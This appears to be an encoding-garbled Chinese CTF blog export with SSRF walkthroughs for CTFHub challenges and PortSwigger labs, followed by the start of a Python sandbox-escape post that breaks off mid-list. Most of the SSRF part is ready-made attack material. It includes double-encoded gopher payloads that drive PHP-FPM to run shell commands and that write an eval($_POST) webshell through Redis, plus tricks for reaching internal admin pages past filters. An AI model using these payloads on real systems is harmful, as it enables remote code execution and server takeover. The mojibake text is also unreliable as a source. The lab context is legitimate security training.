POSTè¯·æ±‚ï¼š POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Length: 36Content-Type: application/x-www-form-urlencodedkey=7cc8e7f97ec84ca8f88fed4a62df26d1 æ ¹æ®ä¸Šé¢çš„çŸ¥è¯†æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬éœ€è¦ç¼–ç ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡ç¼–ç å¦‚ä¸‹ï¼š POST%20/flag.php%20HTTP/1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Length%3A%2036%0AContent-Type%3A%20application/x-www-form-urlencoded%0A%0Akey=7cc8e7f97ec84ca8f88fed4a62df26d1 åœ¨ç¬¬ä¸€æ¬¡ç¼–ç åçš„æ•°æ®ä¸­ï¼Œå°†%0Aå…¨éƒ¨æ›¿æ¢ä¸º%0D%0Aï¼Œå¦‚ä¸‹ï¼š POST%20/flag.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1:80%0AContent-Length:%2036%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Akey=7cc8e7f97ec84ca8f88fed4a62df26d1 å°†å…¶è¿›è¡Œç¬¬äºŒæ¬¡ç¼–ç ï¼Œå¦‚ä¸‹ï¼š POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1%253A80%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=7cc8e7f97ec84ca8f88fed4a62df26d1 æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payloadå¦‚ä¸‹ï¼š view-source:http://challenge-6e02fe4cf49383ad.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=7cc8e7f97ec84ca8f88fed4a62df26d1 ä¸Šä¼ æ–‡ä»¶æˆ‘ä»¬å°è¯•è®¿é—® ?/url=127.0.0.1/flag.php å‘ç°ä¸Šä¼ é¡µé¢å¹¶æ²¡æœ‰æäº¤æŒ‰é’® æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹æºç ï¼Œå¹¶åœ¨fromè¡¨å•ä¸­å†™å…¥ submit ï¼Œå¦‚ä¸‹å›¾ï¼š input type=submit name=submit æˆ‘ä»¬éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œé¡µé¢æç¤ºï¼šJust View From 127.0.0.1 è®©æˆ‘ä»¬æ‹¦æˆªä¸€ä¸‹ä¸Šä¼ è¯·æ±‚ï¼Œç„¶åå°†æ”¹ä¸ºæˆ‘ä»¬æ‰€éœ€è¦çš„ï¼ˆä¸æ˜¯å¿…è¦çš„å¯ä»¥åˆ å»ï¼‰ï¼Œå¦‚ä¸‹ï¼š POST /flag.php HTTP/1.1Host: 127.0.0.1Content-Length: 288Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylc7CixnmWBKYEk99------WebKitFormBoundarylc7CixnmWBKYEk99Content-Disposition: form-data; name=file; filename=test.txtContent-Type: text/plainMancity------WebKitFormBoundarylc7CixnmWBKYEk99Content-Disposition: form-data; name=submitæäº¤------WebKitFormBoundarylc7CixnmWBKYEk99-- æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤è¿›è¡Œç¼–ç ï¼Œæœ€åpayloadå¦‚ä¸‹ï¼š ?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520288%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundarylc7CixnmWBKYEk99%250D%250A%250D%250A------WebKitFormBoundarylc7CixnmWBKYEk99%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522test.txt%2522%250D%250AContent-Type%253A%2520text%252Fplain%250D%250A%250D%250AMancity%250D%250A------WebKitFormBoundarylc7CixnmWBKYEk99%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%250D%250A------WebKitFormBoundarylc7CixnmWBKYEk99-- å‘é€ï¼Œå¾—åˆ°Flag URL Bypassé¢˜ç›®è¦æ±‚ï¼šè¯·æ±‚çš„URLä¸­å¿…é¡»åŒ…å«http://notfound.ctfhub.com æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯æ¥è¿›è¡Œç»•è¿‡ payloadä¸ºï¼š?url=http://notfound.ctfhub.com@127.0.0.1/flag.php å¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ æ•°å­—IP Bypasså¦‚æœè¯´ä½ ç›´æ¥è¾“å…¥ï¼š?url=127.0.0.1ï¼Œé‚£ä¹ˆé¢˜ç›®ä¼šå›æ˜¾hacker! Ban /127|172|@/ è¿™è¯´æ˜æˆ‘ä»¬è¾“å…¥çš„å†…å®¹é‡Œé¢ä¸èƒ½æœ‰127ï¼Œ172ï¼Œ@ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›åˆ¶è½¬æ¢ä¸€ä¸‹ï¼Œæ¯”å¦‚æŠŠå…¶è½¬æ¢ä¸ºåè¿›åˆ¶ï¼š?url=2130706433/flag.php å¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ 302è·³è½¬ Bypassé¦–å…ˆç”¨fileåè®®æŸ¥çœ‹ä¸€ä¸‹æºç ï¼š?url=file://var/www/html/index.phpï¼Œå¾—åˆ°å¦‚ä¸‹ï¼š ?phperror_reporting(0);if (!isset($_REQUEST[url])) header(Location: /?url=_); exit;$url = $_REQUEST[url];if (preg_match(/127|172|10|192/, $url)) exit(hacker! Ban Intranet IP);$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_exec($ch);curl_close($ch); ç¬¬ä¸€ç§ å¯ä»¥çœ‹åˆ°æ­£åˆ™è¡¨è¾¾å¼banæ‰çš„æ•°å­—ï¼ŒæƒŠå¥‡åœ°å‘ç°æ²¡æœ‰banæ‰localhostï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹ï¼š?url=http://localhost/flag.php å¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ ç¬¬äºŒç§ è¿›åˆ¶è½¬åŒ–ï¼ŒæŠŠ127.0.0.1è½¬åŒ–æˆå…¶ä»–è¿›åˆ¶çš„ï¼Œä¹Ÿå¯ä»¥æˆåŠŸ ç¬¬ä¸‰ç§ å½“ç„¶è¿™é¢˜çš„æ ‡å‡†åšæ³•æ˜¯è¦åˆ©ç”¨302è·³è½¬ è®©æˆ‘ä»¬åœ¨æœåŠ¡å™¨ä¸Šé¢å†™ä¸€ä¸ªphpé‡å®šå‘æ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼š ?php header(Location:http://127.0.0.1/flag.php); æŠŠå®ƒæ”¾åˆ°å…¬ç½‘ä¸Šï¼Œç„¶åç”¨urlè®¿é—®å°±å¯ä»¥å•¦ DNSé‡ç»‘å®š Bypassè®¿é—®ï¼š?url=file:///var/www/html/index.phpï¼Œå¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š ?phperror_reporting(0);if (!isset($_REQUEST[url])) header(Location: /?url=_); exit;$url = $_REQUEST[url];if (preg_match(/127|172|10|192/, $url)) exit(hacker! Ban Intranet IP);$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch); ä½†æ˜¯æŒ‰ç…§ä¸Šé¢˜çš„æ€è·¯æ¥åšçš„è¯æ ¹æœ¬è¿‡ä¸å» æŒ‰ç…§é¢˜ç›®ï¼Œè¿™é¢˜å°±é‡‡ç”¨DNSé‡ç»‘å®šæ¥è¿›è¡Œç»•è¿‡å§ è´´ä¸ªæ–‡ç« å¯ä»¥å»çœ‹çœ‹ï¼šæµ…è°ˆDNSé‡ç»‘å®šæ¼æ´ï¼Œå½“ç„¶ä¸Šé¢æˆ‘ä¹Ÿæœ‰ç®€å•è®²è®² åˆ©ç”¨æ–‡ç« æä¾›çš„ç½‘å€æ¥è¿›è¡Œåˆ©ç”¨ï¼šhttps://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg è‡ªå·±è¾“å…¥æ‰€éœ€çš„ç½‘å€ï¼Œæ„é€ payloadä¸ºï¼š?url=7f000001.c0a80001.rbndr.us/flag.php å¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ FastCGIåè®®å¿…çœ‹åŸç† - é™„ä»¶æ–‡ç« åœ¨è¿™é‡Œ å…³äºFastCGIåè®®é™„ä»¶æ–‡ç« è®²çš„å¾ˆæ˜ç™½äº† å…³äºè¿™ä¸ªåè®®æˆ‘ä»¬ä¸»è¦å°±æ˜¯è¦åˆ©ç”¨ä¸€ä¸ª PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ï¼ŒPHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡ã€‚ æ¥ä¸‹æ¥ç”¨åˆ°çš„EXPï¼Œå°±æ˜¯æ ¹æ®ä¹‹å‰ä»‹ç»çš„fastcgiåè®®æ¥ç¼–å†™çš„ï¼Œä»£ç å¦‚ä¸‹ï¼šhttps://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 ã€‚å…¼å®¹Python2å’ŒPython3ï¼Œæ–¹ä¾¿åœ¨å†…ç½‘ç”¨ æˆ‘ä»¬è¿™é‡Œä½¿ç”¨Gopherusè„šæœ¬(GitHubä¸‹è½½)æ„é€ payloadï¼Œè¯¥è„šæœ¬åªèƒ½åœ¨python2.7ä¸‹è¿è¡Œ ç„¶åå¯ä»¥å°†è§£å‹å®Œåçš„æ–‡ä»¶å¤¹æŒªåˆ°è™šæ‹Ÿæœºé‡Œé¢ï¼Œæ‰§è¡Œï¼šapt install python2ï¼Œå®‰è£…python2 ç„¶åæ‰§è¡Œå‘½ä»¤ï¼špython2 gopherus.py --exploit fastcgiï¼Œé¡µé¢é€‰æ‹©index.phpï¼Œå‘½ä»¤é€‰æ‹©ls æŠŠè·å¾—çš„pyloadæ‹¿å»å†ç¼–ç ä¸€æ¬¡å°±å¯ä»¥ ç„¶åå†æ¥ä¸€éï¼Œè¿™æ¬¡å‘½ä»¤é€‰æ‹©cat /f*ï¼Œå¾—åˆ°pyloadï¼Œæ‹¿å»å†ç¼–ç ä¸€æ¬¡ï¼Œå¦‚ä¸‹ï¼š gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F6%2506%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH59%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%253B%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Ff%252A%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500 æ‹¿å»ç”¨ï¼Œå¾—åˆ°flag Redisåè®®è¿™æ¬¡ä¹Ÿæ˜¯ä¸€æ ·ï¼Œç”¨Gopherusè„šæœ¬æ¥å®Œæˆè¯¥é¢˜ ä½¿ç”¨æŒ‡ä»¤ï¼špython2 gopherus.py --exploit redisï¼Œé€‰æ‹©phpï¼Œé»˜è®¤è·¯å¾„ï¼Œä»£ç çš„è¯æˆ‘ä»¬ä½¿ç”¨ä¸€å¥è¯ä»£ç ï¼š?php eval($_POST[cmd]); ? å¾—åˆ°payloadï¼Œæ‹¿å»å†ç¼–ç ä¸€æ¬¡ï¼Œå¦‚ä¸‹ï¼š gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A æ‹¿å»ç”¨ï¼Œå¾—åˆ°å¦‚ä¸‹ç•Œé¢ï¼š è™½ç„¶æ˜¯è¿™æ ·çš„ï¼Œä½†æ˜¯æˆ‘ä»¬çš„shell.phpå·²ç»å†™å…¥äº†ï¼Œè®¿é—®ï¼Œå¦‚ä¸‹ï¼š è™½ç„¶æœ‰ä¸€äº›ä¸å¯è§å­—ç¬¦å•¥çš„ï¼Œä½†è¿˜æ˜¯è¯´æ˜å¯ä»¥è®¿é—®ï¼Œç”¨èšå‰‘è¿æ¥ï¼Œå¾—åˆ°flag Bpå®éªŒå®¤Labï¼šé’ˆå¯¹æœ¬åœ°æœåŠ¡å™¨çš„åŸºæœ¬SSRFé¢˜ç›®ï¼šè¦è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œè¯·æ›´æ”¹åº“å­˜æ£€æŸ¥URLä»¥è®¿é—® http://localhost/admin çš„ç®¡ç†å‘˜ç•Œé¢å¹¶åˆ é™¤ç”¨æˆ· carlos äºæ˜¯æˆ‘ä»¬å…ˆæ‰“å¼€æ’ä»¶Proxyï¼Œç„¶åè®¿é—®ä»»æ„ä¸€ä»¶å•†å“ï¼Œç‚¹å‡»æ£€æŸ¥åº“å­˜ åšå®Œè¿™äº›æ­¥éª¤ä¹‹åæˆ‘ä»¬å»bpçš„ä»£ç†æ¨¡å—çš„HTTPå†å²è®°å½•ä¸­æŸ¥çœ‹æ¯ä¸ªæ¡ç›®ï¼Œæœ€åå‘ç°ä¸€æ¡å¯ç–‘çš„ï¼š/product/stockï¼Œå°†å®ƒå‘é€åˆ°é‡æ”¾å™¨ä¸­ï¼Œå…¶postä¼ å‚çš„stockApiå…¶å®å°±æ˜¯ç¼–ç åçš„è®¿é—®åº“å­˜çš„urlï¼Œäºæ˜¯æˆ‘ä»¬å°†å…¶æ”¹ä¸ºç¼–ç åçš„ http://localhost/adminï¼Œå‘é€å¦‚ä¸‹ï¼š æˆ‘ä»¬éœ€è¦åˆ é™¤ç”¨æˆ·carlosï¼Œurlæ”¹ä¸ºï¼šhttp://location/admin/delete?username=carlosï¼Œç¼–ç åå‘é€ é¢˜ç›®è§£å†³ Labï¼šåŸºæœ¬SSRFä¸å¦ä¸€ä¸ªåç«¯ç³»ç»Ÿçš„å¯¹æ¯”è¦æ±‚ï¼šè¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¯·ä½¿ç”¨åº“å­˜æ£€æŸ¥åŠŸèƒ½æ‰«æç«¯å£8080ä¸Šçš„ç®¡ç†å‘˜ç•Œé¢çš„å†…éƒ¨ 192.168.0.X èŒƒå›´ï¼Œç„¶åä½¿ç”¨å®ƒåˆ é™¤ç”¨æˆ· carlos äºæ˜¯æˆ‘ä»¬å…ˆæ‰“å¼€æ’ä»¶Proxyï¼Œç„¶åè®¿é—®ä»»æ„ä¸€ä»¶å•†å“ï¼Œç‚¹å‡»æ£€æŸ¥åº“å­˜ åšå®Œè¿™äº›æ­¥éª¤ä¹‹åæˆ‘ä»¬å»bpçš„ä»£ç†æ¨¡å—çš„HTTPå†å²è®°å½•ä¸­æŸ¥çœ‹æ¯ä¸ªæ¡ç›®ï¼Œæœ€åå‘ç°ä¸€æ¡å¯ç–‘çš„ï¼š/product/stockï¼Œå°†å®ƒå‘é€åˆ°intruderä¸­ï¼Œå…¶postä¼ å‚çš„stockApiæ”¹ä¸ºæˆ‘ä»¬æ‰€éœ€è¦çš„ï¼šhttp%3A%2F%2F192.168.0.1%3A8080%2Fadminï¼Œæ·»åŠ 1ä½ç½®ä¸ºpyloadï¼Œè¿›è¡Œçˆ†ç ´ï¼Œæ•°å€¼è®¾ä¸º1åˆ°300ï¼Œé—´éš”ä¸º1ï¼Œå¼€å§‹æ”»å‡» æŠŠçˆ†ç ´åçš„ç»“æœæŒ‰çŠ¶æ€ç ä»å°åˆ°å¤§æ’åºï¼Œå¾—åˆ°200çŠ¶æ€ç çš„ç½‘å€ï¼Œåç»­çš„æ“ä½œå’Œä¸Šä¸€é¢˜çš„ä¸€æ¨¡ä¸€æ · é¢˜ç›®è§£å†³ Labï¼šå¸¦å¤–æ£€æµ‹çš„ç›² SSRFè¦æ±‚ï¼šè¯¥ç½‘ç«™ä½¿ç”¨åˆ†æè½¯ä»¶ï¼Œåœ¨åŠ è½½äº§å“é¡µé¢æ—¶è·å– Referer æ ‡å¤´ä¸­æŒ‡å®šçš„ URLã€‚è¦å®Œæˆæœ¬å®éªŒï¼Œè¯·ä½¿ç”¨æ­¤åŠŸèƒ½å‘å…¬å…± Burp Collaborator æœåŠ¡å™¨å‘å‡º HTTP è¯·æ±‚ã€‚ å…ˆæ‰“å¼€æ’ä»¶Proxyï¼Œç„¶åè®¿é—®ä»»æ„ä¸€ä»¶å•†å“ï¼Œä¹‹åæˆ‘ä»¬å»bpçš„ä»£ç†æ¨¡å—çš„HTTPå†å²è®°å½•ä¸­æŸ¥çœ‹æ¯ä¸ªæ¡ç›®ï¼Œå°†/product?productId=1æ¡ç›®å‘é€åˆ°é‡æ”¾å™¨ä¸­ï¼Œé€šè¿‡é¢˜ç›®å¯çŸ¥æˆ‘ä»¬åº”è¯¥æ”¹å˜Refereræ ‡å¤´çš„urlï¼Œæ‰€ä»¥æˆ‘ä»¬å»Burp Collaboratorå¤åˆ¶ä¸€ä¸ªï¼Œç„¶åå°†å…¶ä»£æ›¿æ‰åŸæœ¬çš„urlï¼Œç‚¹å‡»å‘é€ï¼Œä¹‹ååœ¨Burp Collaboratoræ¨¡å—ç‚¹å‡»ç«‹å³è½®è¯¢ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°å‡ æ¡æ•°æ® åˆ°è¿™æ­¥åï¼Œé¢˜ç›®ä¾¿è§£å†³äº† Labï¼šå…·æœ‰åŸºäºé»‘åå•çš„è¾“å…¥è¿‡æ»¤å™¨çš„ SSRFè¦æ±‚ï¼šè¦å®Œæˆè¯¥å®éªŒï¼Œè¯·å°†åº“å­˜æ£€æŸ¥ URL æ›´æ”¹ä¸ºè®¿é—®ç®¡ç†ç•Œé¢ http://localhost/admin å¹¶åˆ é™¤ç”¨æˆ· carlos ã€‚å¼€å‘äººå‘˜éƒ¨ç½²äº†ä¸¤ç§è¾ƒå¼±çš„å SSRF é˜²å¾¡æªæ–½ï¼Œæ‚¨éœ€è¦ç»•è¿‡å®ƒä»¬ åœ¨bpçš„ä»£ç†æ¨¡å—çš„HTTPå†å²è®°å½•ä¸­æŸ¥çœ‹æ¯ä¸ªæ¡ç›®ï¼Œç„¶åå°†/product/stockå‘é€åˆ°é‡æ”¾å™¨ä¸­ï¼Œå…ˆå°†stockApiæ”¹ä¸ºhttp%3A%2F%2F127.0.0.1%2Fadminï¼Œå‘é€å‘ç°è¢«é˜»æ­¢äº† å¼€å§‹ä¸€æ­¥æ­¥å°è¯•ï¼Œå…ˆæ˜¯http%3A%2F%2F127.1ï¼Œå‘é€æˆåŠŸï¼Œæ¥ç€åœ¨åé¢åŠ ä¸Š/adminï¼Œè¢«é˜»æ­¢ï¼ŒçŒœæµ‹æ˜¯æ‹¦ä½äº†adminï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†aç¼–ç ä¸¤æ¬¡ï¼Œä¸ºhttp%3A%2F%2F127.0.0.1%2F%2561dminï¼Œå‘é€æˆåŠŸï¼Œè®¿é—®åˆ°äº†adminé¡µé¢ï¼Œæ¥ä¸‹æ¥çš„æ“ä½œå°±æ˜¯åˆ é™¤ç”¨æˆ·carlos åé¢æŒ‰ä¹‹å‰é‚£æ ·åšå°±å¯ä»¥äº†ï¼Œé¢˜ç›®è§£å†³ Labï¼šSSRF é€šè¿‡å¼€æ”¾é‡å®šå‘æ¼æ´ç»•è¿‡è¿‡æ»¤å™¨æè¿°ï¼šè¦å®Œæˆè¯¥å®éªŒï¼Œè¯·å°†åº“å­˜æ£€æŸ¥ URL æ›´æ”¹ä¸ºè®¿é—®ç®¡ç†ç•Œé¢ http://192.168.0.12:8080/admin å¹¶åˆ é™¤ç”¨æˆ· carlos ã€‚åº“å­˜æ£€æŸ¥å™¨è¢«é™åˆ¶åªèƒ½è®¿é—®æœ¬åœ°åº”ç”¨ç¨‹åºï¼Œå› æ­¤æ‚¨éœ€è¦é¦–å…ˆæ‰¾åˆ°å½±å“åº”ç”¨ç¨‹åºçš„å¼€æ”¾é‡å®šå‘ é¦–å…ˆéšæœºè®¿é—®ä¸€ä¸ªäº§å“å¹¶æ£€æŸ¥åº“å­˜ï¼Œç„¶åç‚¹å‡»next product æ£€æŸ¥HTTPå†å²è®°å½•ï¼Œæœ‰ä¸¤æ¡æ¯”è¾ƒæœ‰æ„æ€çš„éƒ½å°†å…¶å‘é€åˆ°é‡æ”¾å™¨ä¸­ï¼Œåˆ†åˆ«æ˜¯/product/stockå’Œ/product/nextProduct?currentProductId=1path=/product?productId=2 ç¬¬äºŒä¸ªæ¡ç›®å†…å®¹å¦‚ä¸‹ï¼š åŸæœ¬ç¬¬ä¸€ä¸ªæ¡ç›®çš„stockApiè§£ç åä¸ºï¼š/product/stock/check?productId=2storeId=1 å°è¯•ç›´æ¥æŠŠç¬¬ä¸€ä¸ªæ¡ç›®çš„stockApiæ”¹ä¸ºæˆ‘ä»¬éœ€è¦çš„http%3A%2F%2F192.168.0.12%3A8080%2Fadminï¼Œä¼šè¢«é˜»æ­¢è®¿é—® å‘ç°åŸæœ¬çš„stcockApiçš„å†…å®¹å’Œç¬¬äºŒä¸ªæ¡ç›®ä¸­çš„getä¼ å‚çš„å‚æ•°æ˜¯ä¸€æ ·çš„ å°†ç¬¬äºŒä¸ªæ¡ç›®ä¸­çš„pathæ”¹ä¸€ä¸‹/product?productId=3ï¼Œå‘é€ï¼Œç„¶åæŠŠstockApiæ”¹ä¸ºç›¸å¯¹åº”çš„ï¼Œå‘é€ï¼Œæ•°æ®æˆåŠŸå˜æ›´ è¿™è¯´æ˜äº†æˆ‘ä»¬é€šè¿‡æ›´æ”¹pathçš„å†…å®¹å®ç°äº†é‡å®šå‘ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠæˆ‘ä»¬è¦çš„urlæ”¾åœ¨pathä¸­ï¼š/product/nextProduct?path=http://192.168.0.12:8080/adminï¼Œå‘é€ï¼Œç„¶åå¯¹åº”çš„stockApiæ”¹ä¸ºï¼š%2Fproduct%2FnextProduct%3Fpath%3Dhttp%3A%2F%2F192.168.0.12%3A8080%2Fadminï¼Œå‘é€ï¼Œå“åº”å˜ä¸ºäº†å¯¹åº”çš„é¡µé¢çš„å†…å®¹ï¼Œç„¶åå¼€å§‹åˆ é™¤ç”¨æˆ·carlos æ›´æ”¹pathï¼š/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos æ›´æ”¹stockApiï¼š%2Fproduct%2FnextProduct%3Fpath%3Dhttp%3A%2F%2F192.168.0.12%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos æˆåŠŸä¼¤å¤„ç”¨æˆ·carlosï¼Œé¢˜ç›®è§£å†³ å¼•ç”¨SSRFæ¼æ´åŸç†è§£æé€šä¿—æ˜“æ‡‚ SSRFæ¼æ´åŸç†æ”»å‡»ä¸é˜²å¾¡(è¶…è¯¦ç»†æ€»ç»“) Gopheråè®®åœ¨SSRFæ¼æ´ä¸­çš„æ·±å…¥ç ”ç©¶ï¼ˆé™„è§†é¢‘è®²è§£ï¼‰ CTFHubæŠ€èƒ½æ ‘ Web-SSRFç¯‡ï¼ˆä¿å§†çº§é€šè¿‡æ•™ç¨‹ï¼‰","tags":["ssrf"],"categories":["CTF"]},{"title":"pythonæ²™ç›’é€ƒé€¸","path":"/2024/03/19/pythonæ²™ç›’é€ƒé€¸/","content":"å¼•ç”¨Python æ²™ç®±é€ƒé€¸çš„ç»éªŒæ€»ç»“ æ‰§è¡Œç³»ç»Ÿå‘½ä»¤åŸºç¡€çŸ¥è¯†åœ¨ Python ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼æœ‰ï¼š os commandsï¼šä»…é™2.x subprocess timeitï¼štimeit.sysã€timeit.timeit(__import__(os).system(whoami), number=1) platformï¼šplatform.osã€platform.sysã€platform.popen(whoami, mode=r, bufsize=-1).read() ptyï¼špty.spawn(ls)ã€pty.os bdbï¼šbdb.osã€cgi.sys cgiï¼šcgi.osã€cgi.sys â€¦ ä»¥ä¸‹ä¸ºä¸€ä¸ªè„šæœ¬æµ‹è¯•äº†ä¸€ä¸‹æ‰€æœ‰çš„å¯¼å…¥ os æˆ–è€… sys çš„åº“ï¼š #-*- coding:utf8 -*-# By Macr0phag3# in 2019-05-07 19:46:12# ------------------------------------# this, antigravity åº“åˆ æ‰all_modules_2 = [ BaseHTTPServer, imaplib, shelve, Bastion, anydbm, imghdr, shlex, CDROM, argparse, imp, shutil, CGIHTTPServer, array, importlib, signal, Canvas, ast, imputil, site, ConfigParser, asynchat, inspect, sitecustomize, Cookie, asyncore, io, smtpd, DLFCN, atexit, itertools, smtplib, Dialog, audiodev, json, sndhdr, DocXMLRPCServer, audioop, keyword, socket, FileDialog, base64, lib2to3, spwd, FixTk, bdb, linecache, sqlite3, HTMLParser, binascii, linuxaudiodev, sre, IN, binhex, locale, sre_compile, MimeWriter, bisect, logging, sre_constants, Queue, bsddb, lsb_release, sre_parse, ScrolledText, bz2, macpath, ssl, SimpleDialog, cPickle, macurl2path, stat, SimpleHTTPServer, cProfile, mailbox, statvfs, SimpleXMLRPCServer, cStringIO, mailcap, string, SocketServer, calendar, markupbase, stringold, StringIO, cgi, marshal, stringprep, TYPES, cgitb, math, strop, Tix, chunk, md5, struct, Tkconstants, cmath, mhlib, subprocess, Tkdnd, cmd, mimetools, sunau, Tkinter, code, mimetypes, sunaudio, UserDict, codecs, mimify, symbol, UserList, codeop, mmap, symtable, UserString, collections, modulefinder, sys, _LWPCookieJar, colorsys, multifile, sysconfig, _MozillaCookieJar, commands, multiprocessing, syslog, __builtin__, compileall, mutex, tabnanny, __future__, compiler, netrc, talloc, _abcoll, contextlib, new, tarfile, _ast, cookielib, nis, telnetlib, _bisect, copy, nntplib, tempfile, _bsddb, copy_reg, ntpath, termios, _codecs, crypt, nturl2path, test, _codecs_cn, csv, numbers, textwrap, _codecs_hk, ctypes, opcode, _codecs_iso2022, curses, operator, thread, _codecs_jp, datetime, optparse, threading, _codecs_kr, dbhash, os, time, _codecs_tw, dbm, os2emxpath, timeit, _collections, decimal, ossaudiodev, tkColorChooser, _csv, difflib, parser, tkCommonDialog, _ctypes, dircache, pdb, tkFileDialog, _ctypes_test, dis, pickle, tkFont, _curses, distutils, pickletools, tkMessageBox, _curses_panel, doctest, pipes, tkSimpleDialog, _elementtree, dumbdbm, pkgutil, toaiff, _functools, dummy_thread, platform, token, _hashlib, dummy_threading, plistlib, tokenize, _heapq, email, popen2, trace, _hotshot, encodings, poplib, traceback, _io, ensurepip, posix, ttk, _json, errno, posixfile, tty, _locale, exceptions, posixpath, turtle, _lsprof, fcntl, pprint, types, _md5, filecmp, profile, unicodedata, _multibytecodec, fileinput, pstats, unittest, _multiprocessing, fnmatch, pty, urllib, _osx_support, formatter, pwd, urllib2, _pyio, fpformat, py_compile, urlparse, _random, fractions, pyclbr, user, _sha, ftplib, pydoc, uu, _sha256, functools, pydoc_data, uuid, _sha512, future_builtins, pyexpat, warnings, _socket, gc, quopri, wave, _sqlite3, genericpath, random, weakref, _sre, getopt, re, webbrowser, _ssl, getpass, readline, whichdb, _strptime, gettext, repr, wsgiref, _struct, glob, resource, xdrlib, _symtable, grp, rexec, xml, _sysconfigdata, gzip, rfc822, xmllib, _sysconfigdata_nd, hashlib, rlcompleter, xmlrpclib, _testcapi, heapq, robotparser, xxsubtype, _threading_local, hmac, runpy, zipfile, _warnings, hotshot, sched, zipimport, _weakref, htmlentitydefs, select, zlib, _weakrefset, htmllib, sets, abc, httplib, sgmllib, aifc, ihooks, sha]all_modules_3 = [ AptUrl, hmac, requests_unixsocket, CommandNotFound, apport, hpmudext, resource, Crypto, apport_python_hook, html, rlcompleter, DistUpgrade, apt, http, runpy, HweSupportStatus, apt_inst, httplib2, scanext, LanguageSelector, apt_pkg, idna, sched, 